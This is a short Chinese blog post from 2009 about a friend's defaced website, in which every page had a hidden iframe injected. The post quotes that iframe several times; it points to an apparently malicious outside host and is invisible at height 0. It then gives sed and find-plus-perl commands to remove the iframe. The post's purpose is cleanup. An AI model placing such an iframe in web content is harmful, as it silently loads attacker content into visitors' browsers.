---
author: abloz
comments: true
date: 2009-11-17 06:45:00+00:00
layout: post
link: http://abloz.com/index.php/2009/11/17/site-recruited/
slug: site-recruited
title: 网站中招了？
wordpress_id: 953
categories:
- 技术
---

[周海汉](http://blog.csdn.net/ablo_zhou) /文

朋友网站中招了 ，网页全被涂改，每个网页加上了iframe，类似：

<iframe src="http://rx0031.8866.org/xman/2.htm" mce_src="http://rx0031.8866.org/xman/2.htm" width=111 height=0 border=0></iframe>

#  					 				

				

 					  					  					

[周海汉](http://blog.csdn.net/ablo_zhou) /文

朋友网站中招了 ，网页全被涂改，每个网页加上了iframe，类似：

 

[view plain](http://blog.csdn.net/ablo_zhou/archive/2009/11/17/4822986.aspx#)[copy to clipboard](http://blog.csdn.net/ablo_zhou/archive/2009/11/17/4822986.aspx#)[print](http://blog.csdn.net/ablo_zhou/archive/2009/11/17/4822986.aspx#)[?](http://blog.csdn.net/ablo_zhou/archive/2009/11/17/4822986.aspx#)

  1. <iframe src="http://rx0031.8866.org/xman/2.htm" mce_src="http://rx0031.8866.org/xman/2.htm" width=111 height=0 border=0></iframe>

<iframe src="http://rx0031.8866.org/xman/2.htm"  mce_src="http://rx0031.8866.org/xman/2.htm" width=111 height=0  border=0></iframe>

警告，不要乱点该链接，中毒不负责任！！！

 

恰好朋友也是个业余网站管理员，没有做备份什么的。问我怎么办？

想想，只有用脚本了。sed，awk,python

 

1. sed

sed -i -e "s/old/new/g" *

2. find + perl

find . -type f |xargs perl -pi -e "s|old|new|g"

  
  


![](http://img.zemanta.com/pixy.gif?x-id=604183f5-d249-8ce8-b4ca-f5029e8d152c)
